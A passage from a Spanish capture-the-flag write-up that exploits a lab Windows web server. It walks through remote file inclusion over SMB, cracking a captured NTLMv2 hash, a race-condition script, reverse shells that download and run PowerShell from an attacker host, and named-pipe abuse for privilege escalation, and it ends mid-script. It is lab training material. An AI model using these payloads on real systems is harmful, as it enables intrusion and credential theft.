?theme=hola&amp;h=5557007e63c9d95d45ca15a39ff4a5d6(FIN‚Ä¶) Entonces al ejecutarlo, vemos esto con cualquier petici√≥n que hace: Opa, el principal error es que intenta llamar un archivo, pero no lo encuentra (en el caso de la imagen intenta abrir el ‚Äútheme‚Äù intranet en la ruta intranet/header. inc). Estudiamos posible Remote File Inclusion en la web üìå: Ahora, revisando detalladamente el error nos damos cuenta del uso de la funci√≥n: 31 | // Following function securely includes a file. Whenever we 32 | // will encounter a PHP tag we will just bail out here. Aseguran la inclusi√≥n de un archivo, donde si se encuentra un tag de PHP (&lt;?) en el contenido del mismo, simplemente muestra error y no hace el include: 33 | function secure_include($file) { 34 |  if (strpos(file_get_contents($file),'&lt;?') === false) {   &lt;&lt;&lt;&lt;&lt; Error encountered in this line. 35 |   include($file); 36 |  } else { 37 |   http_response_code(403); 38 |   die('Forbidden - Tampering attempt detected. '); 39 |  } 40 | } strpos encuentra la posici√≥n de la primera ocurrencia (cuando encuentra X cadena) en X contenido‚Ä¶  $a === $b / Id√©ntico / true si $a es igual a $b, y la variable es del mismo tipo.    Operadores de comparaci√≥n en PHP.  ¬øSe entiende lo que hace la funci√≥n y el uso de strpos? Simulemos esto para que quede m√°s claro:  Editor PHP online. &lt;?php// Digamos que este es el contenido del archivo, un simple hola en codigo PHP. $contenido_archivo =  &lt;?php echo 'Hola'; ?&gt; ;// Validamos que en el contenido este la cadena &lt;?, si esta, la validacion se vuelve true y nos muestra el error. if (strpos($contenido_archivo, '&lt;?') === false) {  echo  Contenido:  . $contenido_archivo.  \n ;  echo  Tamos bien ;}else {  echo  Contenido:  . $contenido_archivo.  \n ;  echo  Error, tag detectado :P ;}?&gt;Ejecutamos: Contenido: &lt;?php echo 'Hola'; ?&gt;Error, tag detectado :PY si cambiamos el orden del &lt;? igual seguimos teniendo el error :P Contenido: php echo 'Hola'; &lt;?php echo ''; ?&gt;Error, tag detectado :PSi le quitamos el tag y ejecutamos: Contenido: php echo 'ahora no hay tag inicial'; ?&gt;Tamos bienListo, sabienod que hace y como funciona el strpos podemos seguir‚Ä¶ ‚Ä¶ Sabemos que en este caso el error que nos muestra es por que no encuentra el archivo para cargar el ‚Äútheme‚Äù, pero ahora sabemos tambien que valida su contenido en busca de algun tag PHP‚Ä¶ Por si no quieres ver todos los fallos que hice te dejo dos opciones: ü§ç Test con el posible RFI, testeando y dando algunas explicaciones de m√°s yyyy m√°s testeo. ‚ù§Ô∏è Jugando con el RFI logramos interceptar un hash NTLMv2. Testaaando y confirmando Remote File Inclusion üìå: Jugando con esto se me ocurri√≥ levantar un servidor web e intentar cargar un archivo X como ‚Äútheme‚Äù, modificando el script quedar√≠a as√≠: . . . def fuzzing(session):  salt =  hie0shah6ooNoim   payload =  http://10. 10. 14. 178:8000/locuras   # Generamos hash: md5(salt+payload)  hashh = hashlib. md5(salt. encode('utf-8') + payload. encode('utf-8')). hexdigest()  cookie = session. cookies. get_dict()  parameters =  ?theme=  + payload +  &amp;h=  + hashh  r = session. get(url +  /licenses. php  + parameters, cookies=cookie)  print( \n[+] \ Theme\ : %s -&gt; %s  % (payload, parameters))  print(r. text). . . Levantamos el servidor: ‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . Y ejecutamos, vemos que intenta cargar el ‚Äútheme‚Äù: [+]  Theme : http://10. 10. 14. 178:8000/locuras -&gt; ?theme=http://10. 10. 14. 178:8000/locuras&amp;h=63b61941e36339f3b23fc614b16a3124&lt;!-- [2] file_get_contents(http://10. 10. 14. 178:8000/locuras/header. inc): failed to open stream: HTTP request failed! HTTP/1. 0 404 File not found. . . &lt;!-- [2] include(): http:// wrapper is disabled in the server configuration by allow_url_include=0. . . &lt;!-- [2] include(http://10. 10. 14. 178:8000/locuras/header. inc): failed to open stream: no suitable wrapper could be found. . . Y en nuestro servidor: 10. 10. 10. 231 - - [25/Mar/2021 25:25:25] code 404, message File not found10. 10. 10. 231 - - [25/Mar/2021 25:25:25]  GET /locuras/header. inc HTTP/1. 0  404 -üòÆ vemos en los errores de PHP que no esta habilitado el incluir archivos mediante una URL, pero obtenemos la petici√≥n en nuestro servidor de Python, probemos a ver que podemos lograr con esto‚Ä¶  Siempre har√° la petici√≥n buscando un archivo header. inc.  Esto lo hace concatenando el directorio (payload que le podemos pasar) con /header. inc. . inc files: Jugando un rato -logramos- extraer los archivos header. inc de cada theme, esto usando wrappers (antes vimos que el wrapper http estaba deshabilitado), por ejemplo usando el wrapper php:// para que junto a un filtro convierta el contenido de un archivo a base64 (esto es importante para archivos PHP, ya que son interpretados y no podr√≠amos ver su contenido si los llamamos as√≠ como as√≠ e. e) para posteriormente copiar la cadena, decodearla y guardar su resultado en un archivo. As√≠ ver√≠amos el contenido del archivo, hag√°moslo para el header. inc del theme solar:  PHP wrappers - Cheat Sheet. (Agregu√© el tomar el payload desde la terminal, que pereza estar entrando a cambiarlo a mano :P) ‚ù≠ python3 licenses. py  php://filter/convert. base64-encode/resource=solar [+]  Theme : php://filter/convert. base64-encode/resource=solar -&gt; ?theme=php://filter/convert. base64-encode/resource=solar&amp;h=da608eae83164e4c3ff7d60869eeed12PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5MaWNlbnNlczwvdGl0bGU+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJzb2xhci9ib290c3RyYXAubWluLmNzcyI+CiAgPC9oZWFkPgo=üî¢ Archivo licenses. py final. Lo que hace por detr√°s la funci√≥n del c√≥digo PHP es: include(php://filter/convert. base64-encode/resource=solar/header. inc)Tomamos la cadena, la decodeamos y guardamos en un archivo: ‚ù≠ echo  PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5MaWNlbnNlczwvdGl0bGU+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJzb2xhci9ib290c3RyYXAubWluLmNzcyI+CiAgPC9oZWFkPgo=  | base64 -d &gt; solarheader. incYyy: ‚ù≠ cat solarheader. inc&lt;!DOCTYPE html&gt;&lt;html lang= en &gt; &lt;head&gt;  &lt;meta charset= utf-8 &gt;  &lt;title&gt;Licenses&lt;/title&gt;  &lt;meta name= viewport  content= width=device-width, initial-scale=1 &gt;  &lt;link rel= stylesheet  href= solar/bootstrap. min. css &gt; &lt;/head&gt;Solamente vemos las cabeceras que llaman el css de cada theme, o sea para cambiar el fondo de la web :( üèãÔ∏è Simplemente unos recursos que me gustaron, pero en la pr√°ctica no me funcionaron üò•:  Exploit LFI bug when a inc php is appended to the file name.  Exploiting local file inclusion LFI using php wrapper. Jugando con el RFI interceptamos un hash NTLMv2 #: Encontramos este recurso y leyendo vemos un paso que no hab√≠amos intentado: üé´ Bypass allow_url_include:  When allow_url_include and allow_url_fopen are set to Off. It is still possible to include a remote file on Windows box using the smb protocol. Ojiiiiiito, no hab√≠amos intentado el compartirnos una carpeta con SMB y desde el RFI intentar conectarnos a ella, prob√©moslo‚Ä¶ Si recordamos, allow_url_include esta seteado a 0 (o sea apagado Off), lo vimos cuando intentamos llamar el recurso a trav√©s de nuestra URL‚Ä¶ As√≠ que podemos probar los siguientes pasos:  Compartir una carpeta mediante SMB donde tengamos el archivo que queramos llamar.  Y desde la petici√≥n agregar \\&lt;ip&gt;\&lt;folder&gt;\&lt;file&gt;Entonces, levantemos el servidor SMB, donde la carpeta compartida se llama smbFolder y tomara todos los archivos de la ruta actual ($(pwd)): ‚ù≠ python3 smbserver. py smbFolder $(pwd) -smb2supportCreamos un archivo (toctoc. php) y tendr√° este contenido (o cualquier otro): Podemos hacer el mismo proceso, pero con el archivo header. inc, solo que en la petici√≥n pondr√≠amos √∫nicamente nuestra carpeta compartida (recordemos que la misma funci√≥n agrega /header. inc al final). ‚ù≠ cat toctoc. php&lt;?php system( ping -c 1 10. 10. 14. 178 ); ?&gt; Aunque si todo va bien, deber√≠amos ver el error de tempering, ya que &lt;? existe en el archivo‚Ä¶ Y desde la petici√≥n hacemos: ‚ù≠ python3 licenses. py  \\\10. 10. 14. 178\\smbFolder\\toctoc. php . . . En nuestra carpeta compartida tenemos respuesta: [*] Incoming connection (10. 10. 10. 231,63214)[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)[*] User PROPER\web authenticated successfully[*] web::PROPER:aaaaaaaaaaaaaaaa:daf4f08da81ca1e00259289c66835220:010100000000000080b0c6bcc921d701671afff0fbf20627000000000100100070006d004f005a00460041007a006f000300100070006d004f005a00460041007a006f000200100075004100590057004200610076004f000400100075004100590057004200610076004f000700080080b0c6bcc921d7010600040002000000080030003000000000000000000000000020000085e4cbc8f5cc59435a6b4c52725d8e804fa85d00514be6c0b958277c8fa029f80a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370038000000000000000000[*] Closing down connection (10. 10. 10. 231,63214)[*] Remaining connections []. . . # Lo hace muchas veces, asi que obtenemos varias veces una respuesta. Opa, tenemos el hash Net NTLMv2 del usuario del servidor web, en este caso de PROPER/web :P Probemos a crackearla, quiz√°s es d√©bil‚Ä¶ Tomamos web::PROPER:a. . . . . 0000 y lo guardamos en un archivo, lo llamar√© hash e intentamos crackearlo: ‚ù≠ john --wordlist=/usr/share/wordlists/rockyou. txt hashEn un rato vemos esto: Using default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Press 'q' or Ctrl-C to abort, almost any other key for statuscharlotte123!  (web)1g 0:00:00:02 DONE (2021-03-26 25:25) 0. 4629g/s 458800p/s 458800c/s 458800C/s charlotte1990. . charlieishotUse the  --show --format=netntlmv2  options to display all of the cracked passwords reliablySession completedPerfectooooooooooooooooo, tenemos una contrase√±a del usuario web (: peroooo ¬ød√≥nde las usamos? :O En el portal de licencias no logramos nada jugando con mails‚Ä¶  Pa leer: NTLM relay y explicaciones interesantes.  Pa ver: Youtube - S4vitar explicando Net-NTLM. Volviendo a la respuesta de la petici√≥n que hicimos hacia nuestra carpeta compartida nos da un fallo todo lindo (pero al menos es diferente): &lt;!-- [2] include(\\10. 10. 14. 178\smbFolder\toctoc. php/header. inc): failed to open stream: Invalid argumentüé∫ Jugu√© con null bytes, agregando URL Encode (sale el error del tampering), di espacios para que tomara el archivo del folder y despu√©s el header, agregue dentro del archivo header. inc c√≥digo PHP y c√≥digo html para ver si lo interpretaba o al menos no sal√≠a el error anterior, pero nada :(  Ac√° estoy dudando si es que mi carpeta compartida en SMB tiene alg√∫n error (ya que sale el error Invalid Argument, y buscando referencian que es por no escapar \, pero si las escap√©) o no s√© si es que deba salir ese error pero que por detr√°s si se esta subiendo el archivo‚Ä¶ De las pruebas que he hecho no veo que esto √∫ltimo este pasando. ‚Ä¶ De pura locura me puse a revisar el archivo smbserver. py (porque si) y me di cuenta de que podemos levantar la carpeta compartida con un usuario‚Ä¶ ¬øY si intentamos compartirla como si fu√©ramos web? Quiz√°s el problema es la autenticaci√≥n y por eso no lograba la conexi√≥n con el archivo, intent√©moslo: ‚ù≠ python3 smbserver. py smbFolder $(pwd) -smb2support -username web -password  charlotte123! Y ahora lanzamos la petici√≥n a ver si lee nuestro archivo, usemos el header. inc de solar pero con una modificaci√≥n para identificarlo: ‚ù≠ cat header. inc&lt;h2&gt;Este es mi tema perri&lt;/h2&gt;‚ù≠ python3 licenses. py  \\\10. 10. 14. 178\\smbFolder Recibimos en nuestra carpeta compartida: . . . [*] Incoming connection (10. 10. 10. 231,61502)[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)[*] User PROPER\web authenticated successfully[*] web::PROPER:aaaaaaaaaaaaaaaa:c806c7a6bcdc62ef33e516d7483e4856:0101000000000000005dc3b16922d70131c01ee481185b30000000000100100044006a007a004e0057007200450044000300100044006a007a004e0057007200450044000200100077004300750050006200490047005900040010007700430075005000620049004700590007000800005dc3b16922d70106000400020000000800300030000000000000000000000000200000094df3dcd57d3446771048246011a53ff8eff1656c86731c3bcd89f72886362a0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370038000000000000000000[*] Connecting Share(1:SMBFOLDER)[*] Disconnecting Share(1:SMBFOLDER)[*] Closing down connection (10. 10. 10. 231,61502) [*] Remaining connections []Y en la petici√≥n vemos: . . . [+]  Theme : \\10. 10. 14. 178\smbFolder -&gt; ?theme=\\10. 10. 14. 178\smbFolder&amp;h=9958fc71043a62ab691ff2a8f9e77b52&lt;!DOCTYPE html&gt;  &lt;h2&gt;Este es mi tema perri&lt;/h2&gt;  &lt;html lang= en &gt;  &lt;head&gt;    &lt;meta charset= utf-8 &gt;    &lt;title&gt;Licenses&lt;/title&gt;    &lt;meta name= viewport  content= width=device-width, initial-scale=1 &gt;    &lt;link rel= stylesheet  href= solar/bootstrap. min. css &gt;  &lt;/head&gt; &lt;body&gt; . . . . . . PERFECTOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOoowowowo  Lo que hace es: include(\\10. 10. 14. 178\smbFolder/header. inc). En Burp se ve m√°s lindo: Bien bien, tenemos entonces Remote File Inclusion confirmado (que resumidamente es incluir un archivo externo al servidor). Ahora debemos lidiar con strpos, a ver como podemos bypassear esa parte y lograr subir nuestra Shell‚Ä¶ O que interprete nuestro archivo externo. ‚ù≠ cat header. inc&lt;h2&gt;Este es mi tema perri&lt;/h2&gt;Y obtenemos efectivamente el error: ‚ù≠ python3 licenses. py  \\\10. 10. 14. 178\\smbFolder [+]  Theme : \\10. 10. 14. 178\smbFolder -&gt; ?theme=\\10. 10. 14. 178\smbFolder&amp;h=9958fc71043a62ab691ff2a8f9e77b52Forbidden - Tampering attempt detected. Intentando crear un payload (llamado header. inc) con msfvenom para inyectarlo en la web logramos que lo lea, pero no que lo interprete. As√≠ que si o si debemos inyectar c√≥digo . php para que sea interpretado (ejecutado) por la web‚Ä¶ Intentamos Race Condition para sobreescribir contenido del objeto header. inc con c√≥digo PHP üìå: Jmmm d√°ndole varias vueltas podemos pensar algo: La web esta buscando el archivo header. inc cierto? Listo, lo creamos en nuestra carpeta compartida y la web logra leerlo YYY ejecutarlo‚Ä¶ Ac√° f√°cil, pero no podemos simplemente cambiar el contenido del archivo por c√≥digo p, ya que la primera validaci√≥n es que si encuentra &lt;? dentro del contenido del archivo, el proceso ser√° cancela y nos mostrara un error‚Ä¶ Pero ¬øy si intentamos modificar el contenido del archivo header. inc por c√≥digo php al mismo tiempo en que la web lo busca al hacer la solicitud? WTF Podr√≠amos hacer que inicialmente tome el contenido del archivo header. inc (HTML to lindo sin &lt;?), esto har√° que pase el filtro de la funci√≥n strpos y mientras hace el include modificamos el contenido del archivo para que tome nuestro payload y finalmente estar√≠a interpret√°ndolo‚Ä¶ Que ser√≠a un race condition, donde existe un proceso ejecut√°ndose peeeero nosotros al mismo tiempo intentamos ser m√°s r√°pidos y as√≠ ejecutar lo que necesitemos dentro de ese proceso (ganar, por eso es llamada race)‚Ä¶ ‚ö†Ô∏èüõë‚ö†Ô∏è Esto son peque√±os spoilers de m√°quinas retiradas, por si algo :P ‚ö†Ô∏èüõë‚ö†Ô∏è  IppSec lo usa para hacer un link simb√≥lico al id_rsa de un usuario, donde realmente deber√≠a estar mostrando un simple mensaje.  IppSec de nuevo nos muestra como logra inyectar c√≥digo PHP mientras sube un archivo que no deber√≠a tener PHP.  0xdf explica detalladamente como hacer un link simb√≥lico de nuevo al id_rsa mientras se genera un simple mensaje. Esta imagen me gusto mucho, es tomada de ac√°, pero creo que originalmente es tomada de este graaaaaaaan articulo: ‚Ä¶ Bien, ahora que sabemos que es un race condition, intent√©moslo mediante un script que ejecutaremos despu√©s de lanzar la petici√≥n:  Voy a crear una carpeta llamada header en donde estar√° el archivo header. inc simplemente, as√≠ es m√°s sencillo hacer todo :P raceee. sh: #!/bin/bash# Nos situamos donde este header. inc y lo regeneramos con contenido validocd header/cat . . /baksolarheader &gt; header. incfor i in {1. . 5000}; do  # Bucle sobre todos los archivos de la carpeta header/  for file in *; do    # Si el archivo existe y tenemos permisos de lectura. . .     if [[ -r $file ]]; then      # Borramos y generamos el nuevo header. inc pero con el contenido PHP, esto 5000 veces      rm -rf $file      cat . . /ajatuque. php &gt; $file      # O mediante un link simbolico al archivo PHP      #ln -f -s . . /ajatuque. php $file    fi  donedone# Dejamos todo como estaba. . . rm -rf $filecat . . /baksolarheader &gt; header. incEntonces el script sencillamente itera 5000 veces, donde cada una recorre los archivo de la carpeta header/ (que solo tiene header. inc) y una vez tenemos el nombre del archivo (con $file, o sea que ser√≠a siempre igual a header. inc), lo borramos y copiamos el contenido del archivo PHP (con el c√≥digo a inyectar) sobre uno llamado header. inc en la misma ruta‚Ä¶ O tambi√©n podr√≠amos hacer el proceso, pero que en vez de copiar el contenido del PHP nos genere un link simb√≥lico hacia √©l y una vez lea (llame/tome/etc) el archivo header. inc estar√≠a leyendo realmente el contenido del archivo PHP. De cualquiera de las dos formas sirve, entonces probemos: En el archivo PHP vamos a simplemente agregar unas l√≠neas que nos impriman un mensaje y nos ejecuten un comando en el sistema, as√≠ sabemos si esta siendo interpretado y si tenemos RCE, como ya vimos se llama ajatuque. php: &lt;?php   echo  \nPuede ser fayt?\n ;   $coma=shell_exec( whoami );   echo $coma; ?&gt;Creamos de nuevo nuestra carpeta compartida por SMB pero ahora apuntando al directorio /header. ‚ù≠ python3 smbserver. py smbFolder $(pwd)/header -smb2support -username web -password  charlotte123! Estos dos pasos los tenemos que hacer casi simult√°neos, solo debemos darle unos 2-3 segundos a la petici√≥n, para que se haga primero y tome el contenido v√°lido del archivo header. inc (bypasseamos strpos) y ah√≠ si ejecutamos el script para que modifique el contenido del . inc. Lanzamos petici√≥n: ‚ù≠ python3 licenses. py  \\\10. 10. 14. 178\\smbFolder Esperamos 2 segundos y ejecutamos el script, vemos respuesta en nuestra carpeta SMB y como el resultado en la petici√≥n es: ‚ù≠ python3 licenses. py  \\\10. 10. 14. 178\\smbFolder [+]  Theme : \\10. 10. 14. 178\smbFolder -&gt; ?theme=\\10. 10. 14. 178\smbFolder&amp;h=9958fc71043a62ab691ff2a8f9e77b52Puede ser fayt?proper\web &lt;body&gt; . . . . . . Claro que siiiiiiiiiii, tenemos ejecuci√≥n remota de comandos mediante un race condition‚Ä¶ ¬°Que lindura oiga! Listos, pues ahora intentemos generar una Reverse Shell: Lo haremos mediante el archivo Invoke-PowerShellTcp. ps1 del repo nishang: Entonces, nos clonamos el repo (o solo el archivo, yo le cambi√© el nombre a IpsTcp. ps1), lo abrimos y nos copiamos (o movemos) esta l√≠nea: ‚ù≠ cat IpsTcp. ps1. . . # Aprox linea 18PS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192. 168. 254. 226 -Port 4444. . . Nos vamos al final del archivo y la pegamos, pero cambiando la IP y el PUERTO donde queremos recibir la Reverse Shell, tambi√©n le quitamos el PS &gt; del inicio: Invoke-PowerShellTcp -Reverse -IPAddress 10. 10. 14. 178 -Port 4433Guardamos‚Ä¶ Lo que haremos ser√° indicarle mediante el RCE que haga una petici√≥n a este archivo, lo leer√°, pero como al final tenemos una l√≠nea sin comentarios y dispuesta a ser ejecutada, har√° eso, interpretara el archivo y se ejecutara esa l√≠nea, la cual har√° la petici√≥n hacia esa direcci√≥n IP y el puerto, que es donde estaremos escuchando y nos devolver√° una PowerShell :) Modificamos el comando en el archivo: &lt;?php system( powershell -c \ IEX(New-Object Net. WebClient). downloadString('http://10. 10. 14. 178:8000/IpsTcp. ps1')\  );?&gt; Levantamos el servidor web: python3 -m http. server.  Nos ponemos en escucha por el puerto 4433: rlwrap nc -lvp 4433.  Ejecutamos petici√≥n al la carpeta compartida: python3 licenses. py  \\\10. 10. 14. 178\\smbFolder .  Esperamos 2-3 segundos y ejecutamos el script raceee. sh.  Yyyy: Listos, tenemos una PowerShell como el usuario web dentro del sistema :) En este caso no podemos hacer tratamiento de‚Ä¶. ¬øQu√© no? JAAAAA! Dando vueltas encontramos un recurso que nos permite obtener una consola PowerShell Full TTY, en la que podemos hacer CTRL+C, tener hist√≥rico de comandos y movernos entre ellos:  https://github. com/antonioCoco/ConPtyShell. Siguiendo los pasos del repo, nos indica el uso, descarguemos el archivo en la m√°quina para migrarnossss: PS C:\\Users\web\Videos&gt; certutil. exe -f -urlcache -split http://10. 10. 14. 164:8000/Invoke-ConPtyShell. ps1 Invoke-ConPtyShell. ps1En nuestra m√°quina atacante nos ponemos en escucha y vemos el tama√±o de nuestra pantalla, esto lo usaremos ahorita: ‚ù≠ stty size43 192‚ù≠ nc -lvp 4434listening on [any] 4434 . . . Y ejecutamos en la m√°quina v√≠ctima la petici√≥n: PS C:\\Users\web\Videos&gt; IEX(Get-Content . \Invoke-ConPtyShell. ps1 -Raw); Invoke-ConPtyShell -RemoteIp 10. 10. 14. 164 -RemotePort 4434 -Rows 43 -Cols 192Recibimos la petici√≥n y ahora hacemos el tratamiento normal de la TTY:  Hacemos CTRL + Z.  Escribimos stty raw -echo.  Escribimos fg (aunque no se vea).  Damos enter y tamos full. ‚ù≠ nc -lvp 4434listening on [any] 4434 . . . connect to [10. 10. 14. 164] from proper. htb [10. 10. 10. 231] 49336^Z[1]+ Detenido        nc -lvp 4434‚ù≠ stty raw -echo# Ac√° va el  fg ‚ù≠ nc -lvp 4434    # Damos enter y obtenemos. . . Windows PowerShellCopyright (C) Microsoft Corporation. All rights reserved. PS C:\inetpub\wwwroot\licenses&gt;Y tenemos una PowerShell totalmente interactivaaaaaaaaaaaaaaaaaaaaaaaaaaa. Podemos hacer CTRL + C, historial y movernos entre comandos. QU√â recursazo!! Ahora a enumerar‚Ä¶ ‚Ä¶ Escalada de privilegios #Dando vueltas en la ra√≠z encontramos este recurso llamativo: PS C:\Program Files&gt; dir  Directory: C:\Program FilesMode        LastWriteTime     Length Name----        -------------     ------ ----d-----    11/15/2020  4:05 AM        Cleanup. . . Dentro tenemos: PS C:\Program Files\Cleanup&gt; dir  Directory: C:\Program Files\CleanupMode        LastWriteTime     Length Name----        -------------     ------ -----a----    11/15/2020  4:03 AM    2999808 client. exe-a----    11/15/2020  9:22 AM      174 README. md-a----    11/15/2020  5:20 AM    3041792 server. exeInteresante, ejecutandolos tenemos: PS C:\Program Files\Cleanup&gt; type README. md# CleanupWe find the garbage on your system and delete it!## Changelog- 31. 10. 2020 - Alpha Release## Todo- Create an awesome GUI- Check additional pathsPS C:\Program Files\Cleanup&gt; . \client. exeCleaning C:\\Users\web\DownloadsJmm esta borrando archivos de la ruta C:\\Users\web\Downloads: PS C:\Program Files\Cleanup&gt; ls -force c:\\Users\web\DownloadsPS C:\Program Files\Cleanup&gt; Y viendo el servidor: PS C:\Program Files\Cleanup&gt; . \server. exeError: open \\. \pipe\cleanupPipe: Access is denied. Vale, error al abrir un pipe (entiendo que debe ser un named pipe) llamado cleanupPipe.  Un pipe es una secci√≥n de la memoria que los procesos pueden usar para comunicarse entre ellos.  Microsoft Docs - Pipes.  Named Pipes. Si ponemos alg√∫n archivo en la ruta C:\\Users\web\Downloads y ejecutamos el binario client. exe no lo borra :( Aprovechemos la carpeta compartida que tenemos con smbserver. py y copiemos los binarios a nuestra m√°quina a ver si podemos obtener m√°s info de ellos: PS C:\Program Files\Cleanup&gt; copy client. exe \\10. 10. 14. 164\smbFolder\client. exePS C:\Program Files\Cleanup&gt; copy server. exe \\10. 10. 14. 164\smbFolder\server. exeY en nuestra m√°quina ya los tendriamos: ~/sec/htb/proper/content/files/cleanup ¬∑‚ù≠ mv . . /. . /. . /scripts/header/server. exe . ‚ù≠ mv . . /. . /. . /scripts/header/client. exe . ‚ù≠ lsclient. exe server. exeHacemos an√°lisis din√°mico contra los binarios del proceso Cleanup üìå: Validando si encontramos algo √∫til, alguna cadena interesante o leakeada, vemos: ‚ù≠ strings client. exe . . . main. serviceCleanmain. serviceRestoremain. cleanmain. restoremain. main(Validando el inicio de este output, vemos esto: Go build ID: . . . . Es interesante porque podemos pensar desde ya que son binarios hechos en Go, pueda que sea necesario saberlo. ) Tenemos lo que deben ser la funciones del programa, que el principal debe ser main. main y de ah√≠ se van derivando las funcionalidades. Si nos fijamos esta la funci√≥n (eso creemos) cl, pero tambi√©n hay una llamada restore`, esto esta interesante‚Ä¶ Pero ni idea como ser√° el proceso para llegar a ella. Viendo el servidor: ‚ù≠ strings server. exe. . . main. encryptmain. decryptmain. handlemain. cleanmain. restoremain. createServermain. mainJmmm cuenta con m√°s funciones (seguimos creyendo :P), en este caso con dos llamativas, encrypt y decrypt, pero ni idea de su funcionamiento‚Ä¶ En este punto podemos pensar en hacer algo de reversing a ver si logramos entender (o creer entender) que esta haciendo y si podemos aprovecharnos de algo. Pero antes de hacer esto, hagamos un an√°lisis din√°mico, o sea con los programas en ejecuci√≥n a ver si logramos ver algo distinto. Tengo unos problemas con wine, as√≠ que lo mejor ser√° movernos a una m√°quina virtual Windows para probar los binarios‚Ä¶ Estando dentro e intentando ejecutar cl, pero sin el servidor (server. exe`) activo obtenemos el mismo output que antes, pero no se borra nada: Si activamos el servidor (necesitas ejecutarlo con permisos de Administrador) y volvemos a intentar tenemos: Nada. No borra nada‚Ä¶ Despu√©s de jugar un rato, agregando cualquier tipo de archivos, a mano, de internet, etc. Logramos al menos ver un output diferente despu√©s de varios intentos: Opa vemos que el output del cliente es el mismo, pero en el server obtenemos un CLEAN &lt;path_file&gt;. Bueno al menos tenemos algo distinto, pero es muy raro porque si volvemos a generar ese archivo (. lnk) o incluso otros, los borraba y obten√≠amos el output `CL, pero al intentarlo de nuevo (para tomar el screen de que algo pasaba :P) no los volv√≠a a borrar :( Pero bueno, sabemos que si esta funcionando, raro, pero funcionando‚Ä¶ Podr√≠amos pensar que el restore debe ser como un ‚Äúrecuperar lo que se ha borrado‚Äù (creo que tiene l√≥gica). Intentando de alguna forma ejecutar el restore con cosas como:  Borrar y ver si en alg√∫n momento se restauraba autom√°ticamente.  client. exe MicrosoftEdge. lnk --restore.  Otras cositas raras‚Ä¶Nada. Peeeeeeeeeeeeeeeeeeero si intentamos por ejemplo:  client. exe -R MicrosoftEdge. lnk. Obtenemos: Opaaaaa obtenemos en el cliente el mensaje Restoring &lt;file_name&gt;, y el servidor hace un open al archivo que solicitamos, pero pasa el nombre a base64 yyyyyyyy adem√°s lo esta buscando sobre la ruta C:\ProgramData\Cleanup‚Ä¶ Interesantemente extra√±o. ‚ù≠ echo  MicrosoftEdge. lnk  | base64TWljcm9zb2Z0RWRnZS5sbmsK‚ù≠ echo  TWljcm9zb2Z0RWRnZS5sbms=  | base64 -dMicrosoftEdge. lnk‚ù≠ echo  TWljcm9zb2Z0RWRnZS5sbmsK  | base64 -dMicrosoftEdge. lnk‚Ä¶ Despu√©s probando con Reversing logramos ver la instrucci√≥n -R (en hex) esperando ser ejecutada, en este caso tuvimos suerte y dimos con la R sin necesitarlo, pero si no, pues esa parte estar√≠a en el writeup ü§™ (pa que no quede taaaan largo) ‚Ä¶ Interactuamos con el pipe que usa Cleanup üìå: En este punto estuve bastante perdido en el funcionamiento de lo que quer√≠a hacer. Si lo pensamos podemos intuir r√°pidamente que debemos/deber√≠amos intentar, pero el ‚Äúcomo‚Äù fue lo que me estuvo quemando el cerebro (aunque al final es muuuuuuuuuuuuuuuuy sencillo):  Sabemos que borra un archivo y en el servidor llega CLEAN cuando lo hace.  Ese archivo lo quita de la ruta original y lo copia/mueve con un nombre en base64 en la ruta C:\ProgramData\Cleanup.  Si queremos hacerle un restore al archivo, tenemos que pasarle el par√°metro -R con el nombre del archivo borrado (ruta) en texto plano.  Tomara ese texto plano, generara la cadena en base64 y la buscara en la ruta C:\ProgramData\Cleanup, si lo encuentra, lo regenera a la ruta de donde se borr√≥‚Ä¶ Entonces podemos buscar alguna manera de indicarle al pipe cleanupPipe que borre (por ejemplo) el archivo root. txt (suponemos que esta en C:\\Users\Administrator\Desktop).  Aprovecharnos de que el archivo queda encriptado en la ruta C:\ProgramData\Cleanup y ver como podemos restaurarlo para ver su contenido‚Ä¶Entonces, si queremos ‚Äúhablar‚Äù con el pipe podemos apoyarnos de PowerShell, buscando encontramos algunos recursos para guiarnos en nuestro script:  stackoverflow - Asynchronous named pipes in powershell using callbacks.  stackoverflow - PowerShell Named Pipe: no connection?.  PowerShell Named Pipes.  (Me falta un recurso que se me perdi√≥ (que casualidad üò† :sad:), pero de ah√≠ viene esta parte del writeup). Por si se quieren saltar esta parte en la que entendemos como interact√∫a el pipe con los servicios usando IO Ninja y, pero que tambi√©n perdemos tiempo con un script, les hice un regalo: ‚è≥ TEST - Usando IO Ninja para entender los procesos que hace el pipe (gracias 4st1nus). ‚åõ DONE - Viendo el contenido de cualquier archivo del sistema. ‚Ä¶ Usando IO Ninja para ver procesos del pipe üìå:  De nuevo, gracias 4st1nus. En el recurso perdido encontramos esta estructura guapetona: c:\Program Files\Cleanup&gt;type writer. ps1# Define el nombre del pipe$PipeName = 'cleanupPipe'$PipeDir = [System. IO. Pipes. PipeDirection]::Out$PipeOpt = [System. IO. Pipes. PipeOptions]::Asynchronous# Ac√° almacena lo que se envia al pipe mediante un input por consola$Message = Read-Host  Put message to send to pipe try {  # 